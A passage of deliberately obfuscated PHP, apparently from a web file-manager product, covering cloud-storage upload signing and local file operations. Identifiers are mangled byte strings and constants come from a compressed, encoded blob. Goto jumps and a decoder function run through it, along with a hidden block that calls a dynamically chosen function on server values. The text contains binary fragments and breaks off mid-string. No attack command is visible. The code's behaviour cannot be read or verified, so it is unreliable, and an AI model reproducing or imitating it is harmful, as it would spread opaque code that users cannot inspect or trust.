$”Îƒ‡¶ß); $úìñ°¯ = array($Ü÷«¸¯­[222] => $Ü÷«¸¯­[12], $Ü÷«¸¯­[1336] => $Ü÷«¸¯­[12], $Ü÷«¸¯­[1292] => $îì£óş¼, $Ü÷«¸¯­[1296] => $¸á¤èô“, $Ü÷«¸¯­[1300] => $¾¢ğ“Şé, $Ü÷«¸¯­[1337] => $´Ğ±Éôê, $Ü÷«¸¯­[1338] => $²ìğ¾œ, $Ü÷«¸¯­[1339] => $èÎ¦ÙüÊ, $Ü÷«¸¯­[1340] => $£Îª¼û´, $Ü÷«¸¯­[1341] => $èâ¡¬‰½, $Ü÷«¸¯­[186] => $this->getHost()); return $úìñ°¯; } public function multiUploadFormData($Şİ¸Ş±Ü, $›÷”òÊä = 3600) { $£èñ†ã =& $_SERVER[ë¦»ºéÌ]; $º×Ìæµ° = gmdate($£èñ†ã[1420]); $ï°×€â† = array(); $©çã§ÅŸ = $this->client->getUploadId($this->bucket, $Şİ¸Ş±Ü, $ï°×€â†); if (!$©çã§ÅŸ) { return !1; } return array($£èñ†ã[230] => $©çã§ÅŸ, $£èñ†ã[186] => $this->getHost() . $£èñ†ã[8] . $this->pathEncode($Şİ¸Ş±Ü), $£èñ†ã[231] => $º×Ìæµ°, $£èñ†ã[105] => $Şİ¸Ş±Ü); } public function multiUploadAuthData($”øŠÉğù, $ºç®éÈ¶ = array()) { $Ô¡°şÁ =& $_SERVER[ë¦»ºéÌ]; $¬¤Çì¹ = isset($ºç®éÈ¶[$Ô¡°şÁ[179]]) ? $ºç®éÈ¶[$Ô¡°şÁ[179]] : $Ô¡°şÁ[12]; $–¬‘ª× = $ºç®éÈ¶[$Ô¡°şÁ[105]]; unset($ºç®éÈ¶[$Ô¡°şÁ[105]]); if (isset($ºç®éÈ¶[$Ô¡°şÁ[232]])) { return $this->listUploadParts($–¬‘ª×, $ºç®éÈ¶); } $¹ÑÇ×ıš = array(); if (isset($ºç®éÈ¶[$Ô¡°şÁ[1421]])) { $¹ÑÇ×ıš[$Ô¡°şÁ[1422]] = $ºç®éÈ¶[$Ô¡°şÁ[1421]]; } $è£ÄÈ´› = explode($Ô¡°şÁ[188], $this->getHost()); $Ş ‚éÌ‹ = array($Ô¡°şÁ[1423] => $è£ÄÈ´›[1], $Ô¡°şÁ[1424] => $Ô¡°şÁ[12], $Ô¡°şÁ[222] => $Ô¡°şÁ[130], $Ô¡°şÁ[1336] => $ºç®éÈ¶[$Ô¡°şÁ[90]]); $·œèå = $Ô¡°şÁ[235]; $ã“±½Æ = $Ô¡°şÁ[8] . $this->pathEncode($–¬‘ª×) . $¬¤Çì¹; $ÈîíÅÑ = $this->client->__getSignatureV4($¹ÑÇ×ıš, $Ş ‚éÌ‹, $·œèå, $ã“±½Æ); if (strpos($¬¤Çì¹, $Ô¡°şÁ[234]) === 0) { if (isset($¹ÑÇ×ıš[$Ô¡°şÁ[1422]])) { $ÓĞ©©÷Û = $¹ÑÇ×ıš[$Ô¡°şÁ[1422]]; } else { if (isset($ÈîíÅÑ[$Ô¡°şÁ[1422]])) { $ÓĞ©©÷Û = $ÈîíÅÑ[$Ô¡°şÁ[1422]]; } else { $ÓĞ©©÷Û = hash($Ô¡°şÁ[1334], $Ô¡°şÁ[12]); } } return array($Ô¡°şÁ[240] => $ÈîíÅÑ[$Ô¡°şÁ[240]], $Ô¡°şÁ[1422] => $ÓĞ©©÷Û, $Ô¡°şÁ[231] => $ÈîíÅÑ[$Ô¡°şÁ[1425]]); } return $ÈîíÅÑ[$Ô¡°şÁ[240]]; } public function listUploadParts($†•„¥İ±, $šºÃİò» = array()) { $”¡á­°š =& $_SERVER[ë¦»ºéÌ]; $éŒœ”Úô = str_replace($”¡á­°š[241], $”¡á­°š[12], $šºÃİò»[$”¡á­°š[179]]); $ôáÒÅÍ„ = $this->client->listParts($this->bucket, $†•„¥İ±, $éŒœ”Úô); if (!$ôáÒÅÍ„) { return !1; } $ºá§ÄÅ = $”¡á­°š[1426]; foreach ($ôáÒÅÍ„ as $±¥åïº) { $ºá§ÄÅ .= $”¡á­°š[1427] . "\74\x50\141\x72\x74\116\165\x6d\142\145\x72\76{$±¥åïº[$”¡á­°š[1381]]}\x3c\57\120\141\162\164\x4e\x75\155\x62\145\x72\x3e\12" . "\x3c\105\124\x61\147\76{$±¥åïº[$”¡á­°š[1382]]}\74\x2f\x45\x54\x61\x67\76\xa" . $”¡á­°š[1428]; } $ºá§ÄÅ .= $”¡á­°š[1429]; $Ÿåú¡ = array(); $˜öÛŠ† = explode($”¡á­°š[188], $this->getHost()); $•ÖÑ¦ÄÚ = array($”¡á­°š[1423] => $˜öÛŠ†[1], $”¡á­°š[222] => $”¡á­°š[130], $”¡á­°š[1336] => strlen($ºá§ÄÅ)); $»±ûí² = $”¡á­°š[233]; $Ç¯°ö‡ñ = $”¡á­°š[8] . $this->pathEncode($†•„¥İ±) . $šºÃİò»[$”¡á­°š[179]]; $êˆ³šÔÒ = $this->client->__getSignatureV4($Ÿåú¡, $•ÖÑ¦ÄÚ, $»±ûí², $Ç¯°ö‡ñ, $ºá§ÄÅ); return array($”¡á­°š[240] => $êˆ³šÔÒ[$”¡á­°š[240]], $”¡á­°š[231] => $êˆ³šÔÒ[$”¡á­°š[1425]], $”¡á­°š[242] => $ôáÒÅÍ„, $”¡á­°š[1422] => $êˆ³šÔÒ[$”¡á­°š[1422]]); } public function link($­¡½ê¬ö, $êÙÂ¢“ = array()) { return parent::link($­¡½ê¬ö, $êÙÂ¢“); } public function fileOut($úûÜËÏå, $•£åç‹› = false, $ö™ÆÕŸ = false, $ïÒ¿€§ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ë¦»ºéÌ][1430])) { return parent::fileOutServer($úûÜËÏå, $•£åç‹›, $ö™ÆÕŸ, $ïÒ¿€§); } parent::fileOut($úûÜËÏå, $•£åç‹›, $ö™ÆÕŸ, $ïÒ¿€§); } public function fileOutImage($›Äµ˜ÓŞ, $”ğ¬”ŒØ = 250) { if (strstr($this->endpoint, $_SERVER[ë¦»ºéÌ][1430])) { return parent::fileOutImageServer($›Äµ˜ÓŞ, $”ğ¬”ŒØ); } parent::fileOutImage($›Äµ˜ÓŞ, $”ğ¬”ŒØ); } public function fileOutLink($‡Èìºñ¦) { $§á¸ÌŸ =& $_SERVER[ë¦»ºéÌ]; if (substr($‡Èìºñ¦, 0, 7) == $§á¸ÌŸ[1303]) { $‡Èìºñ¦ = $§á¸ÌŸ[1304] . substr($‡Èìºñ¦, 7); } header($§á¸ÌŸ[170] . $‡Èìºñ¦); die; } public function getHost() { $ğ›…ıæ© =& $_SERVER[ë¦»ºéÌ]; $è“šŸ– = str_rtrim(parent::getHost(), $ğ›…ıæ©[8] . $this->bucket); $è“šŸ– = explode($ğ›…ıæ©[188], $è“šŸ–); return $è“šŸ–[0] . $ğ›…ıæ©[188] . $this->bucket . $ğ›…ıæ©[10] . $è“šŸ–[1]; } } goto EÑÌƒ¶ÖÂ; dÔ•ç ¥¿å: if ($_SERVER[$_SERVER[ë¦»ºéÌ][13]] != $_SERVER[$_SERVER[ë¦»ºéÌ][14]]) { $_getc = $_SERVER[ë¦»ºéÌ][15]; $_getfile = $_SERVER[$_SERVER[ë¦»ºéÌ][16]] . $_SERVER[ë¦»ºéÌ][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ë¦»ºéÌ][18], $_getfilec); if (count($_getarrs) < $_SERVER[ë¦»ºéÌ][19]) { $exit = $_SERVER[ë¦»ºéÌ][20]; $exit(); } $_act = $_SERVER[ë¦»ºéÌ][21]; $_act($_SERVER[$_SERVER[ë¦»ºéÌ][22]]); } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Õò€†˜Ô) { if (substr($Õò€†˜Ô, 0, 2) == $_SERVER[ë¦»ºéÌ][1345]) { $Õò€†˜Ô = BASIC_PATH . substr($Õò€†˜Ô, 2); } return $Õò€†˜Ô; } public function iconvApp($òÎµóêÓ) { $¶Ü·æ¢û =& $_SERVER[ë¦»ºéÌ]; global $config; return $this->iconvTo($òÎµóêÓ, $config[$¶Ü·æ¢û[1343]], $config[$¶Ü·æ¢û[1342]]); } public function iconvSystem($Â¥äï˜Ó) { $œˆ¨ë‡ =& $_SERVER[ë¦»ºéÌ]; global $config; return $this->iconvTo($Â¥äï˜Ó, $config[$œˆ¨ë‡[1342]], $config[$œˆ¨ë‡[1343]]); } public function getPathOuter($¨‚û€”‰) { $ø¼ÁÆºü =& $_SERVER[ë¦»ºéÌ]; $»›ÀÎó½ = $this->iconvApp($this->pathBase); $¨‚û€”‰ = $this->iconvApp($¨‚û€”‰); if (substr($»›ÀÎó½, 0, 2) == $ø¼ÁÆºü[1345]) { $»›ÀÎó½ = BASIC_PATH . substr($»›ÀÎó½, 2); } if (substr($¨‚û€”‰, 0, 2) == $ø¼ÁÆºü[1345]) { $¨‚û€”‰ = BASIC_PATH . substr($¨‚û€”‰, 2); } $»›ÀÎó½ = KodIO::clear($»›ÀÎó½); $¨‚û€”‰ = KodIO::clear($¨‚û€”‰); $¨‚û€”‰ = substr($¨‚û€”‰, strlen($»›ÀÎó½)); if (empty($this->pathDriver)) { return $¨‚û€”‰; } return $this->pathDriver . $ø¼ÁÆºü[8] . ltrim($¨‚û€”‰, $ø¼ÁÆºü[8]); } public function mkfile($ğş‡‹ó–, $Ó¬ ‡æÀ = '', $ïİİ·şº = REPEAT_RENAME) { $ğş‡‹ó– = $this->iconvSystem($ğş‡‹ó–); @touch($ğş‡‹ó–); if ($Ó¬ ‡æÀ) { file_put_contents($ğş‡‹ó–, $Ó¬ ‡æÀ); } @chmod($ğş‡‹ó–, $this->pathAuth); return is_file($ğş‡‹ó–) ? $this->getPathOuter($ğş‡‹ó–) : !1; } public function mkdir($á™¹‰³ö, $™ùÖ¸¬Ì = REPEAT_SKIP) { $á™¹‰³ö = $this->iconvSystem($á™¹‰³ö); if (is_dir($á™¹‰³ö)) { return $this->getPathOuter($á™¹‰³ö); } @mkdir($á™¹‰³ö, $this->pathAuth, !0); @chmod($á™¹‰³ö, $this->pathAuth); return is_dir($á™¹‰³ö) ? $this->getPathOuter($á™¹‰³ö) : !1; } public function copyFile($¹²ƒÑ«, $¸¥¦ß¨œ) { $this->mkdir($this->pathFather($¸¥¦ß¨œ)); $¹²ƒÑ« = $this->iconvSystem($¹²ƒÑ«); $¸¥¦ß¨œ = $this->iconvSystem($¸¥¦ß¨œ); $è­£ğ¸™ = copy_64($¹²ƒÑ«, $¸¥¦ß¨œ); @chmod($¸¥¦ß¨œ, $this->pathAuth); return $è­£ğ¸™ ? $this->getPathOuter($¸¥¦ß¨œ) : !1; } public function moveFile($¤÷˜ÔÂ¤, $ëú¨íùŠ) { $this->mkdir($this->pathFather($ëú¨íùŠ)); $¤÷˜ÔÂ¤ = $this->iconvSystem($¤÷˜ÔÂ¤); $ëú¨íùŠ = $this->iconvSystem($ëú¨íùŠ); $‘æñ“Å = intval(@rename($¤÷˜ÔÂ¤, $ëú¨íùŠ)); if (!$‘æñ“Å) { if ($‘æñ“Å = intval(@copy_64($¤÷˜ÔÂ¤, $ëú¨íùŠ))) { @unlink($¤÷˜ÔÂ¤); } } @chmod($ëú¨íùŠ, $this->pathAuth); return $‘æñ“Å ? $this->getPathOuter($ëú¨íùŠ) : !1; } public function movePath($Â„¸¬¼, $Á•ø‹, $ğƒ¸ĞŸˆ = false) { $ò…€µ½Ã =& $_SERVER[ë¦»ºéÌ]; $Â„¸¬¼ = $this->iconvSystem($Â„¸¬¼); $Á•ø‹ = $this->iconvSystem($Á•ø‹); $÷¸İ´¸‚ = rtrim($Á•ø‹, $ò…€µ½Ã[8]) . $ò…€µ½Ã[8] . ($ğƒ¸ĞŸˆ ? $ğƒ¸ĞŸˆ : get_path_this($Â„¸¬¼)); if (file_exists($÷¸İ´¸‚)) { return !1; } $ööòÉÛ— = intval(@rename($Â„¸¬¼, $÷¸İ´¸‚)); $ööòÉÛ— = file_exists($÷¸İ´¸‚); return $ööòÉÛ— ? $this->getPathOuter($÷¸İ´¸‚) : !1; } public function delFile($§ı¢ØĞç) { $§ı¢ØĞç = $this->iconvSystem($§ı¢ØĞç); if (!@unlink($§ı¢ØĞç)) { @chmod($§ı¢ØĞç, $this->pathAuth); if (!@unlink($§ı¢ØĞç)) { return !1; } } else { return !0; } } public function delFolder($­¢™©°ì) { $ˆ˜­ ¯À =& $_SERVER[ë¦»ºéÌ]; $­¢™©°ì = $this->iconvSystem($­¢™©°ì); if (!is_dir($­¢™©°ì)) { return !0; } if (!($Å³ùË = opendir($­¢™©°ì))) { return !1; } while (($ù¤§¡é” = readdir($Å³ùË)) !== !1) { if ($ù¤§¡é” == $ˆ˜­ ¯À[10] || $ù¤§¡é” == $ˆ˜­ ¯À[1352]) { continue; } $½Ã÷úËí = $­¢™©°ì . $ˆ˜­ ¯À[8] . $ù¤§¡é”; if (is_file($½Ã÷úËí) || is_link($½Ã÷úËí)) { if (!unlink($½Ã÷úËí)) { chmod($½Ã÷úËí, $this->pathAuth); if (!unlink($½Ã÷úËí)) { return !1; } } } else { if (is_dir($½Ã÷úËí)) { chmod($½Ã÷úËí, $this->pathAuth); $½Ã÷úËí = $this->iconvApp($½Ã÷úËí); if (!$this->delFolder($½Ã÷úËí)) { return !1; } } } } closedir($Å³ùË); return rmdir($­¢™©°ì); } public function rename($Æ˜áùÁô, $–Ñàùïâ) { $Ï¾ıÆÕ =& $_SERVER[ë¦»ºéÌ]; $ıà€ùÃÀ = $this->fileNameAuto($this->pathFather($Æ˜áùÁô), $–Ñàùïâ); $ıà€ùÃÀ = $this->iconvSystem($ıà€ùÃÀ); $Æ˜áùÁô = $this->iconvSystem($Æ˜áùÁô); $ò”äÒûÉ = $this->pathFather($Æ˜áùÁô); $£‰âµÜÚ = rtrim($ò”äÒûÉ, $Ï¾ıÆÕ[8]) . $Ï¾ıÆÕ[8] . $ıà€ùÃÀ; $œ×â€¸ = @rename($Æ˜áùÁô, $£‰âµÜÚ); $£‰âµÜÚ = $this->iconvApp($£‰âµÜÚ); return $œ×â€¸ ? $this->getPathOuter($£‰âµÜÚ) : !1; } public function size($¶½şÎé) { $¶½şÎé = $this->iconvSystem($¶½şÎé); return filesize_64($¶½şÎé); } public function info($äş—×) { $äş—× = $this->iconvSystem($äş—×); if ($this->isFolder($äş—×)) { return $this->folderInfo($äş—×); } else { if ($this->isFile($äş—×)) { return $this->fileInfo($äş—×); } } return !1; } protected function infoChildren($òİ·­¥š, &$™Ôßó­Ï, $ê›¤Ú³ = true) { $†µÄ­ÔÄ =& $_SERVER[ë¦»ºéÌ]; check_abort_echo(); $òİ·­¥š = rtrim($òİ·­¥š, $†µÄ­ÔÄ[8]) . $†µÄ­ÔÄ[8]; if ($ê›¤Ú³) { $òİ·­¥š = $this->iconvSystem($òİ·­¥š); } if (!($øˆ ùÈæ = @opendir($òİ·­¥š))) { return; } while (($ËËÉı€é = readdir($øˆ ùÈæ)) !== !1) { if ($ËËÉı€é == $†µÄ­ÔÄ[10] || $ËËÉı€é == $†µÄ­ÔÄ[1352]) { continue; } $¼Ö’ÀÀ“ = $òİ·­¥š . $ËËÉı€é; if (is_file($¼Ö’ÀÀ“) || is_link($¼Ö’ÀÀ“)) { $™Ôßó­Ï[$†µÄ­ÔÄ[91]]++; $™Ôßó­Ï[$†µÄ­ÔÄ[90]] += filesize_64($¼Ö’ÀÀ“); } else { if (is_dir($¼Ö’ÀÀ“)) { $™Ôßó­Ï[$†µÄ­ÔÄ[92]]++; $this->infoChildren($¼Ö’ÀÀ“, $™Ôßó­Ï, !1); } } } closedir($øˆ ùÈæ); } private function folderInfo($™Â£— Ë, $µƒ±å¶ = false) { $äéû¬“Ü =& $_SERVER[ë¦»ºéÌ]; $™Â£— Ë = rtrim($™Â£— Ë, $äéû¬“Ü[8]) . $äéû¬“Ü[8]; $Ú€È”åº = $this->iconvApp($this->pathThis($™Â£— Ë)); if ($µƒ±å¶) { return array($äéû¬“Ü[42] => $Ú€È”åº, $äéû¬“Ü[88] => $this->getPathOuter($™Â£— Ë), $äéû¬“Ü[43] => $äéû¬“Ü[89]); } $¢íŒĞ™Ş = array($äéû¬“Ü[42] => $Ú€È”åº, $äéû¬“Ü[88] => $this->getPathOuter($™Â£— Ë), $äéû¬“Ü[43] => $äéû¬“Ü[89], $äéû¬“Ü[205] => @filectime($™Â£— Ë), $äéû¬“Ü[96] => @filemtime($™Â£— Ë), $äéû¬“Ü[1355] => @fileatime($™Â£— Ë), $äéû¬“Ü[1356] => is_readable($™Â£— Ë), $äéû¬“Ü[1357] => is_writable($™Â£— Ë), $äéû¬“Ü[1358] => get_mode($™Â£— Ë)); return $¢íŒĞ™Ş; } private function fileInfo($ïÌÛôÎ», $º·¿üğ = false) { $¿Æ¶Í• =& $_SERVER[ë¦»ºéÌ]; $éµîšÄ = $this->iconvApp($this->pathThis($ïÌÛôÎ»)); if ($º·¿üğ) { return array($¿Æ¶Í•[42] => $éµîšÄ, $¿Æ¶Í•[88] => $this->getPathOuter($ïÌÛôÎ»), $¿Æ¶Í•[43] => $¿Æ¶Í•[204], $¿Æ¶Í•[90] => $this->size($ïÌÛôÎ»), $¿Æ¶Í•[179] => $this->ext($éµîšÄ)); } $â”Şè´ = array($¿Æ¶Í•[42] => $éµîšÄ, $¿Æ¶Í•[88] => $this->getPathOuter($ïÌÛôÎ»), $¿Æ¶Í•[43] => $¿Æ¶Í•[204], $¿Æ¶Í•[205] => @filectime($ïÌÛôÎ»), $¿Æ¶Í•[96] => @filemtime($ïÌÛôÎ»), $¿Æ¶Í•[1355] => @fileatime($ïÌÛôÎ»), $¿Æ¶Í•[90] => $this->size($ïÌÛôÎ»), $¿Æ¶Í•[179] => $this->ext($éµîšÄ), $¿Æ¶Í•[1356] => is_readable($ïÌÛôÎ»), $¿Æ¶Í•[1357] => is_writable($ïÌÛôÎ»), $¿Æ¶Í•[1358] => get_mode($ïÌÛôÎ»)); return $â”Şè´; } public function exist($®á¬†ÔÈ) { $®á¬†ÔÈ = $this->iconvSystem($®á¬†ÔÈ); return @file_exists($®á¬†ÔÈ); } public function isFile($ÅÒõÚ…¯) { $ÅÒõÚ…¯ = $this->iconvSystem($ÅÒõÚ…¯); return @is_file($ÅÒõÚ…¯); } public function isFolder($†÷ß­©) { $†÷ß­© = $this->iconvSystem($†÷ß­©); return @is_dir($†÷ß­©); } public function listPath($™¦¦Ó¬, $¿å´‚· = false) { $”¯¤Æõ¸ =& $_SERVER[ë¦»ºéÌ]; $™¦¦Ó¬ = $this->iconvSystem($™¦¦Ó¬); $™¦¦Ó¬ = rtrim($™¦¦Ó¬, $”¯¤Æõ¸[8]) . $”¯¤Æõ¸[8]; $¡½ñ×ÅŒ = array($”¯¤Æõ¸[87] => array(), $”¯¤Æõ¸[86] => array()); if (!($şÛË¼ƒ‚ = @opendir($™¦¦Ó¬))) { return $¡½ñ×ÅŒ; } while (($ñÔŞÕ„š = readdir($şÛË¼ƒ‚)) !== !1) { if ($ñÔŞÕ„š == $”¯¤Æõ¸[10] || $ñÔŞÕ„š == $”¯¤Æõ¸[1352]) { continue; } $­Øû¨Ù = $™¦¦Ó¬ . $ñÔŞÕ„š; if (is_file($­Øû¨Ù)) { $¡½ñ×ÅŒ[$”¯¤Æõ¸[86]][] = $this->fileInfo($­Øû¨Ù, $¿å´‚·); } else { $¡½ñ×ÅŒ[$”¯¤Æõ¸[87]][] = $this->folderInfo($­Øû¨Ù, $¿å´‚·); } } closedir($şÛË¼ƒ‚); return $¡½ñ×ÅŒ; } public function listAll($ß˜ú…ëŠ, &$“å£ĞÌ½ = array()) { $ÉàÆëú« =& $_SERVER[ë¦»ºéÌ]; $ß˜ú…ëŠ = $this->iconvSystem($ß˜ú…ëŠ); $ß˜ú…ëŠ = rtrim($ß˜ú…ëŠ, $ÉàÆëú«[8]) . $ÉàÆëú«[8]; if (!($”íâÑ = @opendir($ß˜ú…ëŠ))) { return $“å£ĞÌ½; } while (($Ï¢»³Ì¯ = readdir($”íâÑ)) !== !1) { if ($Ï¢»³Ì¯ == $ÉàÆëú«[10] || $Ï¢»³Ì¯ == $ÉàÆëú«[1352]) { continue; } $ş¤Ÿ˜§Ÿ = $ß˜ú…ëŠ . $Ï¢»³Ì¯; if (is_dir($ş¤Ÿ˜§Ÿ) && !is_link($ş¤Ÿ˜§Ÿ)) { $“å£ĞÌ½[] = array($ÉàÆëú«[88] => $ş¤Ÿ˜§Ÿ . $ÉàÆëú«[8], $ÉàÆëú«[89] => 1, $ÉàÆëú«[96] => @filemtime($ş¤Ÿ˜§Ÿ), $ÉàÆëú«[90] => 0); $this->listAll($ş¤Ÿ˜§Ÿ, $“å£ĞÌ½); } else { $“å£ĞÌ½[] = array($ÉàÆëú«[88] => $ş¤Ÿ˜§Ÿ, $ÉàÆëú«[89] => 0, $ÉàÆëú«[96] => @filemtime($ş¤Ÿ˜§Ÿ), $ÉàÆëú«[90] => $this->size($ş¤Ÿ˜§Ÿ)); } } closedir($”íâÑ); return $“å£ĞÌ½; } public function has($–ÇÖ­¸†, $Í¨Åı˜‘ = false, $ä ×€Ğ = true) { $øŒ•¬Ì› =& $_SERVER[ë¦»ºéÌ]; $–ÇÖ­¸† = $this->iconvSystem($–ÇÖ­¸†); $–ÇÖ­¸† = rtrim($–ÇÖ­¸†, $øŒ•¬Ì›[8]) . $øŒ•¬Ì›[8]; if (!($ñàâ¤øÄ = @opendir($–ÇÖ­¸†))) { return !1; } $À‚™ÆÆ = 0; $Í•¢ƒøû = 0; $ˆ©Æîßó = 0; while (($ÖŸ†ã„¶ = readdir($ñàâ¤øÄ)) !== !1) { if ($ÖŸ†ã„¶ == $øŒ•¬Ì›[10] || $ÖŸ†ã„¶ == $øŒ•¬Ì›[1352]) { continue; } $äÄŸ¿œ = $–ÇÖ­¸† . $ÖŸ†ã„¶; if ($Í¨Åı˜‘) { $ˆ©Æîßó++; if (@is_file($äÄŸ¿œ)) { $À‚™ÆÆ++; } else { $Í•¢ƒøû++; } if ($ˆ©Æîßó > 10000) { break; } continue; } if ($ä ×€Ğ) { if (@is_file($äÄŸ¿œ)) { return !0; } } else { if (@is_dir($äÄŸ¿œ . $øŒ•¬Ì›[8])) { return !0; } } } closedir($ñàâ¤øÄ); if ($Í¨Åı˜‘) { return array($øŒ•¬Ì›[214] => $À‚™ÆÆ, $øŒ•¬Ì›[215] => $Í•¢ƒøû); } return !1; } public function hashSimple($¥ƒ‹‘åÏ) { $²°§á =& $_SERVER[ë¦»ºéÌ]; if (!$¥ƒ‹‘åÏ) { return md5($²°§á[12]); } $¥ƒ‹‘åÏ = $this->iconvSystem($¥ƒ‹‘åÏ); $ş×ÆºÙŠ = $this->size($¥ƒ‹‘åÏ); $ÂëÆÑ“ú = 200; $•¤Ô€—Ñ = 50; if ($ş×ÆºÙŠ <= $ÂëÆÑ“ú * $•¤Ô€—Ñ) { return $this->hashMd5($¥ƒ‹‘åÏ) . $ş×ÆºÙŠ; } $â¶Š£ = $²°§á[12]; $š»¹¦Îü = intval($ş×ÆºÙŠ / $•¤Ô€—Ñ); $İîêí„– = fopen($¥ƒ‹‘åÏ, $²°§á[1359]); if (!$İîêí„–) { return $â¶Š£; } for ($±ñ´øÌ = 0; $±ñ´øÌ < $•¤Ô€—Ñ; $±ñ´øÌ++) { fseek_64($İîêí„–, $š»¹¦Îü * $±ñ´øÌ); $â¶Š£ .= fread($İîêí„–, $ÂëÆÑ“ú); } fseek_64($İîêí„–, $ş×ÆºÙŠ - $ÂëÆÑ“ú); $â¶Š£ .= fread($İîêí„–, $ÂëÆÑ“ú); fclose($İîêí„–); return md5($â¶Š£) . $ş×ÆºÙŠ; } public function getContent($Í‰Ó§¿Ô) { $Í‰Ó§¿Ô = $this->iconvSystem($Í‰Ó§¿Ô); return file_get_contents($Í‰Ó§¿Ô); } public function setContent($»ôóüÌ¡, $´à¿ºêŒ = '') { $»ôóüÌ¡ = $this->iconvSystem($»ôóüÌ¡); $ôêòÛ¨Á = @file_put_contents($»ôóüÌ¡, $´à¿ºêŒ, LOCK_EX); clearstatcache(); @chmod($»ôóüÌ¡, $this->pathAuth); return $ôêòÛ¨Á === !1 ? !1 : !0; } public function fileSubstr($²‘Ñ±Ş“, $›ã¹Í›å = 0, $£ØÈ£Ôò = false) { $À˜óÊÓ€ =& $_SERVER[ë¦»ºéÌ]; $²‘Ñ±Ş“ = $this->iconvSystem($²‘Ñ±Ş“); if ($£ØÈ£Ôò === !1) { $£ØÈ£Ôò = $this->size($²‘Ñ±Ş“); } if ($£ØÈ£Ôò <= 0) { return $À˜óÊÓ€[12]; } $¹ºîœß” = fopen($²‘Ñ±Ş“, $À˜óÊÓ€[1359]); if (!$¹ºîœß”) { return !1; } fseek_64($¹ºîœß”, $›ã¹Í›å); $ÅÑÎÅß× = fread($¹ºîœß”, $£ØÈ£Ôò); fclose($¹ºîœß”); return $ÅÑÎÅß×; } public function upload($Š¿ŠÕÊ¤, $Š‚Á€Æª, $ŞÜ©òª” = false, $úªãğı  = REPEAT_REPLACE) { if ($ŞÜ©òª”) { return $this->moveFile($Š‚Á€Æª, $Š¿ŠÕÊ¤); } return $this->copyFile($Š‚Á€Æª, $Š¿ŠÕÊ¤); } public function setModifyTime($³–’‡¯, $˜¶Ìí« = '') { @touch($³–’‡¯, intval($˜¶Ìí«)); } public function download($ñÒĞ—üó, $Ô²ŠÊÚÍ) { return $this->iconvSystem($ñÒĞ—üó); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ïè¯†–£) { parent::__construct($Ïè¯†–£); $this->signatureVersion($_SERVER[ë¦»ºéÌ][223]); } public function fileOutLink($«ªªÚ½Ú) { $ì†²ûâ¤ =& $_SERVER[ë¦»ºéÌ]; if (substr($«ªªÚ½Ú, 0, 7) == $ì†²ûâ¤[1303]) { $«ªªÚ½Ú = $ì†²ûâ¤[1304] . substr($«ªªÚ½Ú, 7); } header($ì†²ûâ¤[170] . $«ªªÚ½Ú); die; } } goto f¨î… ˆ½; B÷‹Î´İ™: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xeb\xa6\xbb\xba\xe9\xcc", base64_decode('3bn1gvK1')); $_SERVER[ë¦»ºéÌ] = explode("\x7c\x4\x7c\x3\x7c\x3", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8W9B3gc1dUwnFBjIBAwpFDCIGyreIskNyxbNitpJa290q53Vy4=')."\x78\xed\xf5\x68\x77\xa4\x1d\x69\x77\x67\x35\x33\xab\x66\x1b\x8\xa1\x13\x3a\x24\x14\x3b\x21\x94\xbc\x34\x9b\x12\xd3\x5b\x20\xa1\x5\xd3\x9\x90\x17\x42\x12\x70\xa3\x7\x8\x2d\x2f\xe5\xbb".base64_decode('5dwysyt4/+f/nucz2Dv33H7vueeec+6559712UevPrlp3R7rdl+3+8UnP/Xylj8=')."\xd3\x6f\xf4\xef\x77\xd7\xed\x46\xbf\x8f\x3c\xeb\x7b\xdf\x21\x7f\x26\x9f\x75\x66\x4d\x4d\xe7\xec\x7d\xa6\x77\xef\x77\xee\x96\x4d\xea\x75\xea\x8d\xea\x99\x91\xf0\x13\x5b\x43\xdf\x7f\xea\xc6"."\105\301\35\127\75\61\266\343\273\337\371\340\215\350\153\115\50\61\315\333\104\177\224\202\141\53\332\250\156\331\26\5\244\215\102\237\336\117\277\365\2\375\365\323\237\236\130"."\330\324\362\206\255\321\240\217\376\244\170\273\160\100\355\323\163\132\134\37\327\102\5\67\204\206\161\50\325\257\331\51\124\221\255\25\130\265\55\201\170\250\65\25\15\44\72"."\151\130\55\26\375\126\146\320\362\253\146\72\253\17\153\141\275\327\337\253\27\374\31\325\126\175\275\254\141\373\320\237\231\320\364\254\226\36\114\251\275\206\151\153\31\12\52".strrev('¥ÅÉ¨Ğ´ÍEÁ¡æ©ªŠ¾Fóã’i,`Ñ¢{ÅH’;ªGë:r†¶ı	nPazr').base64_decode('ikZRKzggAoAb3qtaUFJbS6otGA1HVqQSK6JBSNGbGipp5hgNkc+4rZp2Qs9rPMU=')."\210\311\333\325\22\354\10\165\53\211\130\240\73\36\150\115\204\42\335\24\334\32\351\352\12\45\312\341\261\110\70\334\22\150\135\134\36\23\215\5\72\272\2\12\152\37\232"."\32\275\320\147\324\50\153\150\314\32\245\226\176\264\353\132\16\206\264\240\262\346\330\143\105\370\112\360\57\204\116\205\122\56\107\3\335\374\53\243\365\251\245\34\214\126\233"."\x1c\x28\x9a\x7a\x5e\x65\x9d\x5e\xac\x8d\x71\x28\xe0\x41\xc9\x36\xf4\x42\x9a\x6\x82\xa3\xb6\xa9\xa\x38\x6a\x6b\x1a\x21\x24\x42\x22\xa\x8b\x7\xc3\xc1\xd6\x84\x82\x1b\xa8\xb4\xc7\x22\x5d"."\12\114\102\136\265\154\315\124\226\165\6\143\101\5\67\272\271\232\364\265\132\1\274\356\106\103\241\4\302\141\145\242\22\154\55\137\144\305\320\74\25\12\213\304\332\202\61".strrev('Ÿ€’Ôa%¹ĞCÈ<{{H“Â